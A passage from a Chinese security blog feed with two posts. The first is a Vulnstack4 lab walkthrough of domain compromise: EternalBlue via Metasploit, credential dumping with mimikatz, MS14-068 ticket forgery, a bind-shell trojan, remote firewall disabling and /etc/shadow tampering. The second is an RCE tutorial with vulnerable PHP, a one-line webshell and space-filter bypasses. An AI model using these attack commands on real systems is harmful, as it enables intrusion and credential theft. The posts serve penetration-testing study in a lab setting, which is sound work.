<li>without-password：root可以登录，但是不允许通过密码ssh登陆</li>
<li>forced-commands-only：可以登录，但是登陆后不能进入交互，而是执行指定的命令后自动退出</li>
</ul>
</blockquote>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717223312448.png" alt="image-20220717223312448"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先在kali里创一个普通用户</span></span><br><span class="line">useradd -m hack</span><br><span class="line">passwd hack</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用上面创建的用户信息修改目标/etc/passwd和/etc/shadow</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;hack:x:1002:1002::/home/hack:/bin/sh&#x27;</span> &gt;&gt; /hacker/etc/passwd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;hack:$6$sZJ3nupD0kfMhAN5$rQ36pINAUIDIE7HCvbWOBLhdtDL5M7D5dw2Af5saRzTbI0PHFBlc2DyDjQPH1880gpDr4VrHh526hxigF5Ksk.:19190:0:99999:7:::&#x27;</span> &gt;&gt; /hacker/etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在kali中ssh登录该用户</span></span><br><span class="line">ssh hack@192.168.184.139</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717180458569.png" alt="image-20220717180458569"></p>
<p>这里还只是普通用户权限</p>
<p>直接使用<code>sudo su root</code>进行提权会提示用户不在sudoers file中</p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717181515687.png" alt="image-20220717181515687"></p>
<p>我们可以回到tomcat的shell里去手动添加</p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717181841154.png" alt="image-20220717181841154"></p>
<p>再次执行<code>sudo su root</code>，提权成功</p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717181946938.png" alt="image-20220717181946938"></p>
<p>这里觉得白日梦组长的姿势太帅了，学到了很多</p>
<h4 id="姿势2：ssh密钥利用"><a href="#姿势2：ssh密钥利用" class="headerlink" title="姿势2：ssh密钥利用"></a>姿势2：ssh密钥利用</h4><blockquote>
<p>前提：目标已经开启ssh密钥登陆功能，因为虽然我们能修改/etc/ssh/sshd_config</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">RSAAuthentication</span> <span class="literal">yes</span></span><br><span class="line">PubkeyAuthentication <span class="literal">yes</span></span><br></pre></td></tr></table></figure>

<p>但是没有权限重启ssh服务</p>
</blockquote>
<p>挂载就不赘述了，同姿势1</p>
<p>这里查看配置文件/etc/ssh/sshd_config，开启密钥登陆，故可行</p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717223100634.png" alt="image-20220717223100634"></p>
<ol>
<li><p>制作密钥对</p>
<p>首先在kali上制作密钥对。首先用密码登录到你打算使用密钥登录的账户，然后执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717224512053.png" alt="image-20220717224512053"></p>
</li>
<li><p>在目标上安装公钥</p>
<p>首先利用冰蝎将生成的公钥<code>id_rsa.pub</code>上传到目标<code>/hacker/home/ubuntu/.ssh/</code>目录，然后执行如下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat id_rsa.pub &gt;&gt; authorized_keys</span><br></pre></td></tr></table></figure>

<p>这里还需要对一些权限进行修改</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 600 authorized_keys</span><br><span class="line">chmod 700 /hacker/home/ubuntu/.ssh</span><br></pre></td></tr></table></figure></li>
<li><p>ssh密钥登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -i /root/.ssh/id_rsa ubuntu@192.168.184.139</span><br></pre></td></tr></table></figure>

<p>但是不知道为什么我试了好多次都没有成功，我甚至重新把这个ubuntu装了一遍还是不行，离谱</p>
</li>
</ol>
<h3 id="攻入内网"><a href="#攻入内网" class="headerlink" title="攻入内网"></a>攻入内网</h3><p>前面已经拿下了Ubuntu这台服务器，查看网卡信息</p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718113156078.png" alt="image-20220718113156078"></p>
<p>看到有192.168.183.0/24内网网段</p>
<p>利用<code>scp</code>将fscan传到Ubuntu上，利用fscan对内网进行漏洞探针</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line">scp /fscan hack@192.168.184.139:/tmp</span><br><span class="line"><span class="comment">## 密码：123456777</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu</span></span><br><span class="line">chmod +x /tmp/fscan</span><br><span class="line">/tmp/fscan -h 192.168.183.0/24</span><br></pre></td></tr></table></figure>

<p>fscan扫描结果如下</p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718115340547.png" alt="image-20220718115340547"></p>
<p>192.168.183.132这台windows7存在永恒之蓝，直接利用msf开打</p>
<p>因为是内网主机，所以这里需要我们正向去打</p>
<p>首先利用ssh在kali本地的1080端口开启一个动态代理</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -D 1080 hack@192.168.184.139</span><br><span class="line"><span class="comment"># 密码：123456777</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718115523769.png" alt="image-20220718115523769"></p>
<p>之后利用msf去打，这里有两点要注意，一是要设置正向payload，二是要设置一个全局变量proxies</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">search eternalblue</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp  # 正向连接的payload</span><br><span class="line"><span class="built_in">set</span> rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">132</span></span><br><span class="line">setg proxies socks5:<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">1080</span>  # setg是设置全局变量的意思，这里设置代理才能访问到内网主机</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>获取到win7的shell，并且获取到system权限</p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718120048139.png" alt="image-20220718120048139"></p>
<p>这里拿到shell去翻桌面看看时，发现有MS14-068.exe，靶场作者已经明示让我用这个洞去打与空了</p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718120749389.png" alt="image-20220718120749389"></p>
<p>这里其实还可以通过<code>systeminfo</code>命令看打了哪些补丁来看存在什么漏洞</p>
<p>好，明确了目标，用MS14-068来打域控，这时还差域用户名，域名，域用户sid，域控地址以及密码</p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718121846579.png" alt="image-20220718121846579"></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 这里域用户名，域名，域控地址都可以很快得到</span><br><span class="line">域用户名：douser</span><br><span class="line">域名：demo.com</span><br><span class="line">域控地址：<span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">130</span></span><br></pre></td></tr></table></figure>

<p>要获得sid需要切换到域用户权限，获得密码要借助mimikatz(靶机上本来就有一个)</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 没切换用户前，当前为system，看不到域用户的sid</span><br><span class="line">whoami /all</span><br><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718123117476.png" alt="image-20220718123117476"></p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718123126631.png" alt="image-20220718123126631"></p>
<p>这里就需要窃取域用户的令牌，降权到域用户身份，才能读到域用户sid</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># msf的meterpreter</span><br><span class="line">ps</span><br><span class="line">steal_token <span class="number">2552</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718123340564.png" alt="image-20220718123340564"></p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718123502861.png" alt="image-20220718123502861"></p>
<p>得到demo\douser用户的sid<code>S-1-5-21-979886063-1111900045-1414766810-1107</code></p>
<p>然后我们在meterpreter处使用命令<code>rev2self</code>移除令牌，回到system权限，用mimikatz读取密码</p>
<p>此处有个坑，我用ms17_010获得的system权限在运行mimikatz的时候回报错：</p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718124306186.png" alt="image-20220718124306186"></p>
<p>查找网上wp说模拟一个目标机上的system的令牌就可以，但我也没有成功</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">load</span> Incognito</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure>

<p>最后看白日梦组长的视频，使用msf中meterpreter的kiwi模块</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">load kiwi</span></span><br><span class="line"><span class="attribute">creds_all</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718124936180.png" alt="image-20220718124936180"></p>
<p>得到douser的密码<code>Dotest123</code></p>
<p>接下来就利用MS14-068来生成票据</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ms14-<span class="number">068</span> -u douser@demo.com -p Dotest123 -s S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">979886063</span>-<span class="number">1111900045</span>-<span class="number">1414766810</span>-<span class="number">1107</span> -d <span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">130</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718125446698.png" alt="image-20220718125446698"></p>
<p>然后利用mimikatz的kerberos::ptc进行票据传递</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz</span><br><span class="line"><span class="function">kerberos::<span class="title">ptc</span> <span class="title">TGT_douser</span>@<span class="title">demo.com.ccache</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718125636062.png" alt="image-20220718125636062"></p>
<p>然后就拿下域控了</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 注意这里必须用主机名称才能访问，用ip不得行</span><br><span class="line"><span class="built_in">dir</span> \\WIN-ENS2VR5TR3N\c$</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718125946996.png" alt="image-20220718125946996"></p>
<p>进一步攻击域控获取域控密码等</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># win7</span><br><span class="line">## 用<span class="built_in">net</span> use和域控建立连接</span><br><span class="line"><span class="built_in">net</span> use \\WIN-ENS2VR5TR3N</span><br><span class="line"></span><br><span class="line"># kali</span><br><span class="line">## kali创建正向连接木马(默认开启<span class="number">4444</span>监听)</span><br><span class="line">msfvenom -p windows/meterpreter/bind_tcp -f exe -o bind.exe</span><br><span class="line"></span><br><span class="line">## 利用msf的meterpreter的upload将bind.exe上传到win7</span><br><span class="line">upload /bind.exe c:\\users\\douser\\desktop\\bind.exe</span><br><span class="line"></span><br><span class="line">## msf开启监听(另外启一个)</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">130</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">4444</span></span><br><span class="line">setg proxies socks5:<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">1080</span></span><br><span class="line"><span class="built_in">set</span> AutoRunScript post/windows/manage/migrate  # 自动迁移进程</span><br><span class="line"></span><br><span class="line">#win7</span><br><span class="line">## 然后通过win7将bind.exe传到域控上(WIN-ENS2VR5TR3N)</span><br><span class="line"><span class="built_in">copy</span> c:\Users\douser\Desktop\bind.exe \\WIN-ENS2VR5TR3N\c$</span><br><span class="line"></span><br><span class="line">## 通过远程在域控上面设置好计划任务(但是提示Access is denied)</span><br><span class="line">schtasks /create /tn &quot;test&quot; /tr C:\windows\system32\bind.exe /sc MINUTE /S <span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">130</span></span><br><span class="line"></span><br><span class="line">## 我们用sc服务来远程执行，先关闭防火墙</span><br><span class="line">sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= &quot;netsh advfirewall <span class="built_in">set</span> allprofiles state off&quot;</span><br><span class="line">sc \\WIN-ENS2VR5TR3N <span class="built_in">start</span> unablefirewall</span><br><span class="line"></span><br><span class="line">## 创建服务执行msf马</span><br><span class="line">sc \\WIN-ENS2VR5TR3N create bindshell binpath= &quot;c:\bind.exe&quot;</span><br><span class="line">sc \\WIN-ENS2VR5TR3N <span class="built_in">start</span> bindshell</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718144354407.png" alt="image-20220718144354407"></p>
<p>运行完木马后msf收到shell</p>
<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718144727846.png" alt="image-20220718144727846"></p>
<p>接下来抓取密码</p>
<p>通过meterpreter的upload将mimikatz传上去</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">upload /mimikatz.exe c:\mimikatz.exe</span><br><span class="line"><span class="built_in">cd</span> c:\</span><br><span class="line">mimikatz</span><br><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonpasswords</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718150112535.png" alt="image-20220718150112535"></p>
<p>得到明文密码：<code>Test2022</code></p>
<p>有了明文密码，接下来登录远程桌面</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 利用meterpreter把远程桌面开启</span><br><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718150403954.png" alt="image-20220718150403954"></p>
<p>然后上代理远程登陆</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">proxychains4 rdesktop <span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">130</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220718150657246.png" alt="image-20220718150657246"></p>
<p>到此结束</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[<a href="https://www.bilibili.com/video/BV19r4y1y7Nk?spm_id_from=333.337.search-card.all.click&vd_source=fb474708f246c21e5933eeb76372688d">网络安全/域渗透]内网安全入门靶场 vulnstack4攻略</a></p>
<p><a href="https://www.freebuf.com/articles/network/244704.html">记一次Vulnstack靶场内网渗透（二）</a></p>
<p><a href="https://xz.aliyun.com/t/6511">一句话木马踩坑记</a></p>
<p><a href="http://c.biancheng.net/view/839.html">Linux /etc/passwd内容解释</a></p>
<p><a href="http://c.biancheng.net/view/840.html">Linux /etc/shadow（影子文件）内容解析</a></p>
<p><a href="https://www.runoob.com/w3cnote/set-ssh-login-key.html">设置 SSH 通过密钥登录 </a></p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>内网安全，vulnstack</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE</title>
    <url>/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<blockquote>
<p>Remote Command/Code Execution</p>
</blockquote>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/RCE.png" alt="RCE"></p>
<span id="more"></span>

<h2 id="漏洞形成条件"><a href="#漏洞形成条件" class="headerlink" title="漏洞形成条件"></a>漏洞形成条件</h2><p>存在可控变量</p>
<p>存在可利用的漏洞函数</p>
<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%94%E7%A4%BA.png" alt="代码执行演示"></p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">system(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%94%E7%A4%BA.png" alt="命令执行演示"></p>
<h2 id="RCE漏洞产生相关函数"><a href="#RCE漏洞产生相关函数" class="headerlink" title="RCE漏洞产生相关函数"></a>RCE漏洞产生相关函数</h2><h3 id="PHP代码执行函数："><a href="#PHP代码执行函数：" class="headerlink" title="PHP代码执行函数："></a>PHP代码执行函数：</h3><ol>
<li><code>eval()//把字符串作为PHP代码执行</code></li>
<li><code>assert()//检查一个断言是否为 FALSE，可用来执行代码</code></li>
<li><code>preg_replace()//执行一个正则表达式的搜索和替换</code></li>
<li><code>call_user_func()//把第一个参数作为回调函数调用</code></li>
<li><code>call_user_func_array()//调用回调函数，并把一个数组参数作为回调函数的参数</code></li>
<li><code>array_map()//为数组的每个元素应用回调函数</code></li>
</ol>
<h3 id="PHP命令执行函数："><a href="#PHP命令执行函数：" class="headerlink" title="PHP命令执行函数："></a>PHP命令执行函数：</h3><ol>
<li><code>system()//执行外部程序，并且显示输出</code></li>
<li><code>exec()//执行一个外部程序</code></li>
<li><code>shell_exec()//通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回</code></li>
<li><code>passthru()//执行外部程序并且显示原始输出</code></li>
<li><code>pcntl_exec()//在当前进程空间执行指定程序</code></li>
<li><code>popen()//打开进程文件指针</code></li>
<li><code>proc_open()//执行一个命令，并且打开用来输入/输出的文件指针</code></li>
</ol>
<h3 id="Java命令执行"><a href="#Java命令执行" class="headerlink" title="Java命令执行"></a>Java命令执行</h3><p>java.lang.Runtime.getRuntime(.exec(command)</p>
<h3 id="Java代码执行"><a href="#Java代码执行" class="headerlink" title="Java代码执行"></a>Java代码执行</h3><p>Java中没有类似php中eval 函数这种直接可以将字符串转化为代码执行的函数，</p>
<p>但是有反射机制，并且有各种基于反射机制的表达式引擎，如：OGNL、SpEL、MVEL等，这些都能造成代码执行漏洞。</p>
<h3 id="python代码执行"><a href="#python代码执行" class="headerlink" title="python代码执行"></a>python代码执行</h3><ol>
<li><code>exec(string)# Python代码的动态执行</code></li>
<li><code>eval(string)# 返回表达式或代码对象的值</code></li>
<li><code>execfile(string)# 从一个文件中读取和执行Python脚本</code></li>
<li><code>input(string)#Python2.x 中 input() 相等于 eval(raw_input(prompt)) ，用来获取控制台的输入</code></li>
<li><code>compile(string)# 将源字符串编译为可执行对象</code></li>
</ol>
<h3 id="python命令执行"><a href="#python命令执行" class="headerlink" title="python命令执行"></a>python命令执行</h3><ol>
<li><code>system()#执行系统指令</code></li>
<li><code>popen()#popen()方法用于从一个命令打开一个管道</code></li>
<li><code>subprocess.call #执行由参数提供的命令</code></li>
<li><code>spawn #执行命令</code></li>
</ol>
<h2 id="一句话WebShell后门原理代码执行"><a href="#一句话WebShell后门原理代码执行" class="headerlink" title="一句话WebShell后门原理代码执行"></a>一句话WebShell后门原理代码执行</h2><p>PHP一句话</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//cmd为密码</span></span><br><span class="line"><span class="comment">//@是可以屏蔽函数执行过程中遇到问题而产生的一些错误、警告信息，这样用户就看不到程序的出错信息。这样除了用户界面会友好一些外，更重要的是安全性，因为屏蔽了出错文件的路径等信息。</span></span><br></pre></td></tr></table></figure>



<p>caidao原理：将写好的功能数据包，在图形化界面通过一句话木马去触发</p>
<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><h3 id="黑盒功能点命令执行-应用功能"><a href="#黑盒功能点命令执行-应用功能" class="headerlink" title="黑盒功能点命令执行-应用功能"></a>黑盒功能点命令执行-<em>应用功能</em></h3><p>地址：<a href="https://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhe">墨者学院-命令注入执行分析 </a></p>
<h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><p>访问靶场所给地址</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp1.png" alt="黑盒功能点命令执行-wp1"></p>
<p><code>ping 127.0.0.1</code>结果</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp2.png" alt="黑盒功能点命令执行-wp2"></p>
<p>用管道符<code>|</code>去执行其他命令<code>ping 127.0.0.1|ls</code>，有弹窗报错</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp4.png" alt="黑盒功能点命令执行-wp4"></p>
<p>继续上一步操作，多了一个关闭提示框的选项，猜测这里进行了IP格式的前端验证</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp5.png" alt="黑盒功能点命令执行-wp5"></p>
<p>右键查看源码果然有js的验证</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp6.png" alt="黑盒功能点命令执行-wp6"></p>
<p>用burpsuite抓包就可以要过前端验证</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp7.png" alt="黑盒功能点命令执行-wp7"></p>
<p><code>ls</code>命令查看当前目录文件，找到key</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp8.png" alt="黑盒功能点命令执行-wp8"></p>
<p>直接<code>cat&lt;key_148351137230146.php</code>没有回显，应该是过滤了空格</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp9.png" alt="黑盒功能点命令执行-wp9"></p>
<p>过滤了空格。我们需要将空格用其他字符替代一下，这里有两种方法<code>&lt;</code>和<code>$&#123;IFS&#125;</code></p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp10.png" alt="黑盒功能点命令执行-wp10"></p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp11.png" alt="黑盒功能点命令执行-wp11"></p>
<p>另外还有两个点</p>
<p>一是读文件还可以用<code>tac</code></p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp12.png" alt="黑盒功能点命令执行-wp12"></p>
<p>另一个是除了用管道符，还可以用<code>;</code>(分号)</p>
